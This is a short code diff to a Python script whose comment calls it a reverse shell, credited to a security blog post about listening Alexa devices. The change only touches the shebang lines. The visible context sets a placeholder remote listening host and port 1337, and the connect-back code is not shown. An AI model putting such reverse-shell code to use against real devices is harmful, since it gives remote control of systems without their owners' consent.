@@ -1,7 +1,6 @@
-#!/usr/bin/env python
+#!/usr/bin/python
 # reverse shell taken from https://labs.mwrinfosecurity.com/blog/alexa-are-you-listening/
 
-#!/usr/bin/python
 import socket,subprocess,os
 host = "x.x.x.x" # Our remote listening server
 port = 1337
